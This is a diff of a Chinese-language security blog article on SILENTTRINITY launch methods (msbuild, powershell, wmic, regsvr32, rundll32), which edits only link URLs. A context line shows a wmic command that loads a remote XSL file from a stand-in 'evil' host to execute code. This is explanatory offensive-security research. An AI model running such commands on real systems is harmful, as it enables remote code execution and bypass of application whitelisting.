@@ -154,7 +154,7 @@ msbuild.xml实现了将加密字符串做base64解码，解密出SILENTTRINITY�
 
 这个利用方法我在之前的文章有过利用分析：
 
-[《Use MSBuild To Do More》](https://3gstudent.github.io/Use-MSBuild-To-Do-More/)
+[《Use MSBuild To Do More》](https://3gstudent.github.io/Use-MSBuild-To-Do-More)
 
 #### 2. powershell
 
@@ -179,7 +179,7 @@ $main = $type.GetMethod("Main")
 
 这个利用方法我在之前的文章有过利用分析：
 
-[《利用Assembly Load & LoadFile绕过Applocker的分析总结》](https://3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/)
+[《利用Assembly Load & LoadFile绕过Applocker的分析总结》](https://3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93)
 
 #### 3. wmic
 
@@ -206,14 +206,14 @@ C:\Windows\System32\wbem\WMIC.exe os get /format:"https://example.com/evil.xsl"
 
 这个利用方法我在之前的文章有过利用分析：
 
-[《利用wmic调用xsl文件的分析与利用》](https://3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/)
+[《利用wmic调用xsl文件的分析与利用》](https://3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8)
 
 #### 4. 其他可供利用的方法
 
 SILENTTRINITY未包括，此处作为扩展，例如：
 
 - regsvr32.exe，《Code Execution of Regsvr32.exe》
-- rundll32.exe，[《关于利用rundll32执行程序的分析》](https://3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/)
+- rundll32.exe，[《关于利用rundll32执行程序的分析》](https://3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90)
 
 
 
